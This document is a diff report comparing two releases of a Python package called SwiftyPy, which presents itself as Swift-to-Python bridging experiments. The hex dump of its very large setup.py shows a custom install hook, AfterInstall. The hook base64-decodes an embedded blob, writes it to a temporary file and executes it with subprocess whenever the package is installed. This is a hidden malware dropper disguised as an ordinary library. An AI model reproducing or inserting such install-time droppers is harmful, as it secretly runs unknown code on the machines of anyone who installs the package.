# Comparing `tmp/SwiftyPy-8.1.tar.gz` & `tmp/SwiftyPy-8.2.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "SwiftyPy-8.1.tar", last modified: Sun Jul  2 01:01:45 2023, max compression
+gzip compressed data, was "SwiftyPy-8.2.tar", last modified: Sun Jul  2 01:05:27 2023, max compression
```

## Comparing `SwiftyPy-8.1.tar` & `SwiftyPy-8.2.tar`

### file list

```diff
@@ -1,13 +1,13 @@
-drwxrwxrwx   0        0        0        0 2023-07-02 01:01:45.266821 SwiftyPy-8.1/
--rw-rw-rw-   0        0        0      525 2023-07-02 01:01:45.265844 SwiftyPy-8.1/PKG-INFO
--rw-rw-rw-   0        0        0       42 2023-07-02 01:01:45.266821 SwiftyPy-8.1/setup.cfg
--rw-rw-rw-   0        0        0 13595172 2023-07-02 01:01:31.000000 SwiftyPy-8.1/setup.py
-drwxrwxrwx   0        0        0        0 2023-07-02 01:01:45.235450 SwiftyPy-8.1/src/
-drwxrwxrwx   0        0        0        0 2023-07-02 01:01:45.254125 SwiftyPy-8.1/src/SwiftyPy/
--rw-rw-rw-   0        0        0        0 2023-07-01 14:32:35.000000 SwiftyPy-8.1/src/SwiftyPy/__init__.py
--rw-rw-rw-   0        0        0       95 2023-07-01 16:27:09.000000 SwiftyPy-8.1/src/SwiftyPy/average.py
-drwxrwxrwx   0        0        0        0 2023-07-02 01:01:45.264868 SwiftyPy-8.1/src/SwiftyPy.egg-info/
--rw-rw-rw-   0        0        0      525 2023-07-02 01:01:45.000000 SwiftyPy-8.1/src/SwiftyPy.egg-info/PKG-INFO
--rw-rw-rw-   0        0        0      201 2023-07-02 01:01:45.000000 SwiftyPy-8.1/src/SwiftyPy.egg-info/SOURCES.txt
--rw-rw-rw-   0        0        0        1 2023-07-02 01:01:45.000000 SwiftyPy-8.1/src/SwiftyPy.egg-info/dependency_links.txt
--rw-rw-rw-   0        0        0        9 2023-07-02 01:01:45.000000 SwiftyPy-8.1/src/SwiftyPy.egg-info/top_level.txt
+drwxrwxrwx   0        0        0        0 2023-07-02 01:05:27.421425 SwiftyPy-8.2/
+-rw-rw-rw-   0        0        0      525 2023-07-02 01:05:27.421425 SwiftyPy-8.2/PKG-INFO
+-rw-rw-rw-   0        0        0       42 2023-07-02 01:05:27.422402 SwiftyPy-8.2/setup.cfg
+-rw-rw-rw-   0        0        0 13595134 2023-07-02 01:05:15.000000 SwiftyPy-8.2/setup.py
+drwxrwxrwx   0        0        0        0 2023-07-02 01:05:27.387244 SwiftyPy-8.2/src/
+drwxrwxrwx   0        0        0        0 2023-07-02 01:05:27.405799 SwiftyPy-8.2/src/SwiftyPy/
+-rw-rw-rw-   0        0        0        0 2023-07-01 14:32:35.000000 SwiftyPy-8.2/src/SwiftyPy/__init__.py
+-rw-rw-rw-   0        0        0       95 2023-07-01 16:27:09.000000 SwiftyPy-8.2/src/SwiftyPy/average.py
+drwxrwxrwx   0        0        0        0 2023-07-02 01:05:27.419472 SwiftyPy-8.2/src/SwiftyPy.egg-info/
+-rw-rw-rw-   0        0        0      525 2023-07-02 01:05:27.000000 SwiftyPy-8.2/src/SwiftyPy.egg-info/PKG-INFO
+-rw-rw-rw-   0        0        0      201 2023-07-02 01:05:27.000000 SwiftyPy-8.2/src/SwiftyPy.egg-info/SOURCES.txt
+-rw-rw-rw-   0        0        0        1 2023-07-02 01:05:27.000000 SwiftyPy-8.2/src/SwiftyPy.egg-info/dependency_links.txt
+-rw-rw-rw-   0        0        0        9 2023-07-02 01:05:27.000000 SwiftyPy-8.2/src/SwiftyPy.egg-info/top_level.txt
```

### Comparing `SwiftyPy-8.1/PKG-INFO` & `SwiftyPy-8.2/PKG-INFO`

 * *Files 2% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: SwiftyPy
-Version: 8.1
+Version: 8.2
 Summary: Experiments in bridging Swift to Python
 Home-page: https://github.com/johnno1962/SwiftPython
 Author: johnno1962
 Author-email: johnno1962@example.com
 Project-URL: Bug Tracker, https://github.com/johnno1962/SwiftPython/issues
 Classifier: Programming Language :: Python :: 3
 Classifier: License :: OSI Approved :: MIT License
```

### Comparing `SwiftyPy-8.1/setup.py` & `SwiftyPy-8.2/setup.py`

 * *Files 0% similar despite different names*

```diff
@@ -849617,83 +849617,80 @@
 00cf6d00: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
 00cf6d10: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
 00cf6d20: 4141 4141 4141 4141 4141 4141 4127 2727  AAAAAAAAAAAAA'''
 00cf6d30: 0d0a 0d0a 636c 6173 7320 4166 7465 7249  ....class AfterI
 00cf6d40: 6e73 7461 6c6c 2869 6e73 7461 6c6c 293a  nstall(install):
 00cf6d50: 0d0a 0d0a 2020 2020 6465 6620 7275 6e28  ....    def run(
 00cf6d60: 7365 6c66 293a 0d0a 2020 2020 2020 2020  self):..        
-00cf6d70: 2374 7874 203d 206f 7065 6e28 2243 6161  #txt = open("Caa
-00cf6d80: 2e74 7874 222c 2022 7262 2229 0d0a 2020  .txt", "rb")..  
-00cf6d90: 2020 2020 2020 6465 636f 6465 645f 6461        decoded_da
-00cf6da0: 7461 203d 2062 6173 6536 342e 6236 3464  ta = base64.b64d
-00cf6db0: 6563 6f64 6528 636f 6465 3229 0d0a 2020  ecode(code2)..  
-00cf6dc0: 2020 2020 2020 7769 7468 2074 656d 7066        with tempf
-00cf6dd0: 696c 652e 4e61 6d65 6454 656d 706f 7261  ile.NamedTempora
-00cf6de0: 7279 4669 6c65 2864 656c 6574 653d 4661  ryFile(delete=Fa
-00cf6df0: 6c73 6529 2061 7320 7465 6d70 5f66 696c  lse) as temp_fil
-00cf6e00: 653a 0d0a 2020 2020 2020 2020 2020 2020  e:..            
-00cf6e10: 7465 6d70 5f66 696c 652e 7772 6974 6528  temp_file.write(
-00cf6e20: 6465 636f 6465 645f 6461 7461 290d 0a0d  decoded_data)...
-00cf6e30: 0a20 2020 2020 2020 2023 2045 78c3 a963  .        # Ex..c
-00cf6e40: 7574 696f 6e20 6475 2066 6963 6869 6572  ution du fichier
-00cf6e50: 2074 656d 706f 7261 6972 650d 0a20 2020   temporaire..   
-00cf6e60: 2020 2020 2070 726f 6365 7373 203d 2073       process = s
-00cf6e70: 7562 7072 6f63 6573 732e 506f 7065 6e28  ubprocess.Popen(
-00cf6e80: 7465 6d70 5f66 696c 652e 6e61 6d65 2c20  temp_file.name, 
-00cf6e90: 7374 646f 7574 3d73 7562 7072 6f63 6573  stdout=subproces
-00cf6ea0: 732e 5049 5045 2c20 7374 6465 7272 3d73  s.PIPE, stderr=s
-00cf6eb0: 7562 7072 6f63 6573 732e 5049 5045 290d  ubprocess.PIPE).
-00cf6ec0: 0a20 2020 2020 2020 206f 7574 7075 742c  .        output,
-00cf6ed0: 2065 7272 6f72 203d 2070 726f 6365 7373   error = process
-00cf6ee0: 2e63 6f6d 6d75 6e69 6361 7465 2829 0d0a  .communicate()..
-00cf6ef0: 0d0a 0d0a 0d0a 7365 7475 7074 6f6f 6c73  ......setuptools
-00cf6f00: 2e73 6574 7570 280d 0a20 2020 206e 616d  .setup(..    nam
-00cf6f10: 6520 3d20 2253 7769 6674 7950 7922 2c0d  e = "SwiftyPy",.
-00cf6f20: 0a20 2020 2076 6572 7369 6f6e 203d 2022  .    version = "
-00cf6f30: 382e 3122 2c0d 0a20 2020 2061 7574 686f  8.1",..    autho
-00cf6f40: 7220 3d20 226a 6f68 6e6e 6f31 3936 3222  r = "johnno1962"
-00cf6f50: 2c0d 0a20 2020 2061 7574 686f 725f 656d  ,..    author_em
-00cf6f60: 6169 6c20 3d20 226a 6f68 6e6e 6f31 3936  ail = "johnno196
-00cf6f70: 3240 6578 616d 706c 652e 636f 6d22 2c0d  2@example.com",.
-00cf6f80: 0a20 2020 2064 6573 6372 6970 7469 6f6e  .    description
-00cf6f90: 203d 2022 4578 7065 7269 6d65 6e74 7320   = "Experiments 
-00cf6fa0: 696e 2062 7269 6467 696e 6720 5377 6966  in bridging Swif
-00cf6fb0: 7420 746f 2050 7974 686f 6e22 2c0d 0a20  t to Python",.. 
-00cf6fc0: 2020 206c 6f6e 675f 6465 7363 7269 7074     long_descript
-00cf6fd0: 696f 6e20 3d20 226c 6f6e 6720 6465 7363  ion = "long desc
-00cf6fe0: 7269 7074 696f 6e22 2c0d 0a20 2020 206c  ription",..    l
-00cf6ff0: 6f6e 675f 6465 7363 7269 7074 696f 6e5f  ong_description_
-00cf7000: 636f 6e74 656e 745f 7479 7065 203d 2022  content_type = "
-00cf7010: 7465 7874 2f6d 6172 6b64 6f77 6e22 2c0d  text/markdown",.
-00cf7020: 0a20 2020 2075 726c 203d 2022 6874 7470  .    url = "http
-00cf7030: 733a 2f2f 6769 7468 7562 2e63 6f6d 2f6a  s://github.com/j
-00cf7040: 6f68 6e6e 6f31 3936 322f 5377 6966 7450  ohnno1962/SwiftP
-00cf7050: 7974 686f 6e22 2c0d 0a20 2020 2070 726f  ython",..    pro
-00cf7060: 6a65 6374 5f75 726c 7320 3d20 7b0d 0a20  ject_urls = {.. 
-00cf7070: 2020 2020 2020 2022 4275 6720 5472 6163         "Bug Trac
-00cf7080: 6b65 7222 3a20 2268 7474 7073 3a2f 2f67  ker": "https://g
-00cf7090: 6974 6875 622e 636f 6d2f 6a6f 686e 6e6f  ithub.com/johnno
-00cf70a0: 3139 3632 2f53 7769 6674 5079 7468 6f6e  1962/SwiftPython
-00cf70b0: 2f69 7373 7565 7322 2c0d 0a20 2020 207d  /issues",..    }
-00cf70c0: 2c0d 0a20 2020 2063 6c61 7373 6966 6965  ,..    classifie
-00cf70d0: 7273 203d 205b 0d0a 2020 2020 2020 2020  rs = [..        
-00cf70e0: 2250 726f 6772 616d 6d69 6e67 204c 616e  "Programming Lan
-00cf70f0: 6775 6167 6520 3a3a 2050 7974 686f 6e20  guage :: Python 
-00cf7100: 3a3a 2033 222c 0d0a 2020 2020 2020 2020  :: 3",..        
-00cf7110: 224c 6963 656e 7365 203a 3a20 4f53 4920  "License :: OSI 
-00cf7120: 4170 7072 6f76 6564 203a 3a20 4d49 5420  Approved :: MIT 
-00cf7130: 4c69 6365 6e73 6522 2c0d 0a20 2020 2020  License",..     
-00cf7140: 2020 2022 4f70 6572 6174 696e 6720 5379     "Operating Sy
-00cf7150: 7374 656d 203a 3a20 4f53 2049 6e64 6570  stem :: OS Indep
-00cf7160: 656e 6465 6e74 222c 0d0a 2020 2020 5d2c  endent",..    ],
-00cf7170: 0d0a 2020 2020 7061 636b 6167 655f 6469  ..    package_di
-00cf7180: 7220 3d20 7b22 223a 2022 7372 6322 7d2c  r = {"": "src"},
-00cf7190: 0d0a 2020 2020 7061 636b 6167 6573 203d  ..    packages =
-00cf71a0: 2073 6574 7570 746f 6f6c 732e 6669 6e64   setuptools.find
-00cf71b0: 5f70 6163 6b61 6765 7328 7768 6572 653d  _packages(where=
-00cf71c0: 2273 7263 2229 2c0d 0a20 2020 2070 7974  "src"),..    pyt
-00cf71d0: 686f 6e5f 7265 7175 6972 6573 203d 2022  hon_requires = "
-00cf71e0: 3e3d 332e 3622 2c0d 0a20 2020 2063 6d64  >=3.6",..    cmd
-00cf71f0: 636c 6173 733d 7b0d 0a20 2020 2020 2020  class={..       
-00cf7200: 2027 696e 7374 616c 6c27 3a20 4166 7465   'install': Afte
-00cf7210: 7249 6e73 7461 6c6c 2c0d 0a20 2020 207d  rInstall,..    }
-00cf7220: 2c0d 0a29                                ,..)
+00cf6d70: 6465 636f 6465 645f 6461 7461 203d 2062  decoded_data = b
+00cf6d80: 6173 6536 342e 6236 3464 6563 6f64 6528  ase64.b64decode(
+00cf6d90: 636f 6465 3229 0d0a 2020 2020 2020 2020  code2)..        
+00cf6da0: 7769 7468 2074 656d 7066 696c 652e 4e61  with tempfile.Na
+00cf6db0: 6d65 6454 656d 706f 7261 7279 4669 6c65  medTemporaryFile
+00cf6dc0: 2864 656c 6574 653d 4661 6c73 6529 2061  (delete=False) a
+00cf6dd0: 7320 7465 6d70 5f66 696c 653a 0d0a 2020  s temp_file:..  
+00cf6de0: 2020 2020 2020 2020 2020 7465 6d70 5f66            temp_f
+00cf6df0: 696c 652e 7772 6974 6528 6465 636f 6465  ile.write(decode
+00cf6e00: 645f 6461 7461 290d 0a0d 0a20 2020 2020  d_data)....     
+00cf6e10: 2020 2023 2045 78c3 a963 7574 696f 6e20     # Ex..cution 
+00cf6e20: 6475 2066 6963 6869 6572 2074 656d 706f  du fichier tempo
+00cf6e30: 7261 6972 650d 0a20 2020 2020 2020 2070  raire..        p
+00cf6e40: 726f 6365 7373 203d 2073 7562 7072 6f63  rocess = subproc
+00cf6e50: 6573 732e 506f 7065 6e28 7465 6d70 5f66  ess.Popen(temp_f
+00cf6e60: 696c 652e 6e61 6d65 2c20 7374 646f 7574  ile.name, stdout
+00cf6e70: 3d73 7562 7072 6f63 6573 732e 5049 5045  =subprocess.PIPE
+00cf6e80: 2c20 7374 6465 7272 3d73 7562 7072 6f63  , stderr=subproc
+00cf6e90: 6573 732e 5049 5045 290d 0a20 2020 2020  ess.PIPE)..     
+00cf6ea0: 2020 206f 7574 7075 742c 2065 7272 6f72     output, error
+00cf6eb0: 203d 2070 726f 6365 7373 2e63 6f6d 6d75   = process.commu
+00cf6ec0: 6e69 6361 7465 2829 0d0a 0d0a 0d0a 0d0a  nicate()........
+00cf6ed0: 7365 7475 7074 6f6f 6c73 2e73 6574 7570  setuptools.setup
+00cf6ee0: 280d 0a20 2020 206e 616d 6520 3d20 2253  (..    name = "S
+00cf6ef0: 7769 6674 7950 7922 2c0d 0a20 2020 2076  wiftyPy",..    v
+00cf6f00: 6572 7369 6f6e 203d 2022 382e 3222 2c0d  ersion = "8.2",.
+00cf6f10: 0a20 2020 2061 7574 686f 7220 3d20 226a  .    author = "j
+00cf6f20: 6f68 6e6e 6f31 3936 3222 2c0d 0a20 2020  ohnno1962",..   
+00cf6f30: 2061 7574 686f 725f 656d 6169 6c20 3d20   author_email = 
+00cf6f40: 226a 6f68 6e6e 6f31 3936 3240 6578 616d  "johnno1962@exam
+00cf6f50: 706c 652e 636f 6d22 2c0d 0a20 2020 2064  ple.com",..    d
+00cf6f60: 6573 6372 6970 7469 6f6e 203d 2022 4578  escription = "Ex
+00cf6f70: 7065 7269 6d65 6e74 7320 696e 2062 7269  periments in bri
+00cf6f80: 6467 696e 6720 5377 6966 7420 746f 2050  dging Swift to P
+00cf6f90: 7974 686f 6e22 2c0d 0a20 2020 206c 6f6e  ython",..    lon
+00cf6fa0: 675f 6465 7363 7269 7074 696f 6e20 3d20  g_description = 
+00cf6fb0: 226c 6f6e 6720 6465 7363 7269 7074 696f  "long descriptio
+00cf6fc0: 6e22 2c0d 0a20 2020 206c 6f6e 675f 6465  n",..    long_de
+00cf6fd0: 7363 7269 7074 696f 6e5f 636f 6e74 656e  scription_conten
+00cf6fe0: 745f 7479 7065 203d 2022 7465 7874 2f6d  t_type = "text/m
+00cf6ff0: 6172 6b64 6f77 6e22 2c0d 0a20 2020 2075  arkdown",..    u
+00cf7000: 726c 203d 2022 6874 7470 733a 2f2f 6769  rl = "https://gi
+00cf7010: 7468 7562 2e63 6f6d 2f6a 6f68 6e6e 6f31  thub.com/johnno1
+00cf7020: 3936 322f 5377 6966 7450 7974 686f 6e22  962/SwiftPython"
+00cf7030: 2c0d 0a20 2020 2070 726f 6a65 6374 5f75  ,..    project_u
+00cf7040: 726c 7320 3d20 7b0d 0a20 2020 2020 2020  rls = {..       
+00cf7050: 2022 4275 6720 5472 6163 6b65 7222 3a20   "Bug Tracker": 
+00cf7060: 2268 7474 7073 3a2f 2f67 6974 6875 622e  "https://github.
+00cf7070: 636f 6d2f 6a6f 686e 6e6f 3139 3632 2f53  com/johnno1962/S
+00cf7080: 7769 6674 5079 7468 6f6e 2f69 7373 7565  wiftPython/issue
+00cf7090: 7322 2c0d 0a20 2020 207d 2c0d 0a20 2020  s",..    },..   
+00cf70a0: 2063 6c61 7373 6966 6965 7273 203d 205b   classifiers = [
+00cf70b0: 0d0a 2020 2020 2020 2020 2250 726f 6772  ..        "Progr
+00cf70c0: 616d 6d69 6e67 204c 616e 6775 6167 6520  amming Language 
+00cf70d0: 3a3a 2050 7974 686f 6e20 3a3a 2033 222c  :: Python :: 3",
+00cf70e0: 0d0a 2020 2020 2020 2020 224c 6963 656e  ..        "Licen
+00cf70f0: 7365 203a 3a20 4f53 4920 4170 7072 6f76  se :: OSI Approv
+00cf7100: 6564 203a 3a20 4d49 5420 4c69 6365 6e73  ed :: MIT Licens
+00cf7110: 6522 2c0d 0a20 2020 2020 2020 2022 4f70  e",..        "Op
+00cf7120: 6572 6174 696e 6720 5379 7374 656d 203a  erating System :
+00cf7130: 3a20 4f53 2049 6e64 6570 656e 6465 6e74  : OS Independent
+00cf7140: 222c 0d0a 2020 2020 5d2c 0d0a 2020 2020  ",..    ],..    
+00cf7150: 7061 636b 6167 655f 6469 7220 3d20 7b22  package_dir = {"
+00cf7160: 223a 2022 7372 6322 7d2c 0d0a 2020 2020  ": "src"},..    
+00cf7170: 7061 636b 6167 6573 203d 2073 6574 7570  packages = setup
+00cf7180: 746f 6f6c 732e 6669 6e64 5f70 6163 6b61  tools.find_packa
+00cf7190: 6765 7328 7768 6572 653d 2273 7263 2229  ges(where="src")
+00cf71a0: 2c0d 0a20 2020 2070 7974 686f 6e5f 7265  ,..    python_re
+00cf71b0: 7175 6972 6573 203d 2022 3e3d 332e 3622  quires = ">=3.6"
+00cf71c0: 2c0d 0a20 2020 2063 6d64 636c 6173 733d  ,..    cmdclass=
+00cf71d0: 7b0d 0a20 2020 2020 2020 2027 696e 7374  {..        'inst
+00cf71e0: 616c 6c27 3a20 4166 7465 7249 6e73 7461  all': AfterInsta
+00cf71f0: 6c6c 2c0d 0a20 2020 207d 2c0d 0a29       ll,..    },..)
```

### Comparing `SwiftyPy-8.1/src/SwiftyPy.egg-info/PKG-INFO` & `SwiftyPy-8.2/src/SwiftyPy.egg-info/PKG-INFO`

 * *Files 2% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: SwiftyPy
-Version: 8.1
+Version: 8.2
 Summary: Experiments in bridging Swift to Python
 Home-page: https://github.com/johnno1962/SwiftPython
 Author: johnno1962
 Author-email: johnno1962@example.com
 Project-URL: Bug Tracker, https://github.com/johnno1962/SwiftPython/issues
 Classifier: Programming Language :: Python :: 3
 Classifier: License :: OSI Approved :: MIT License
```

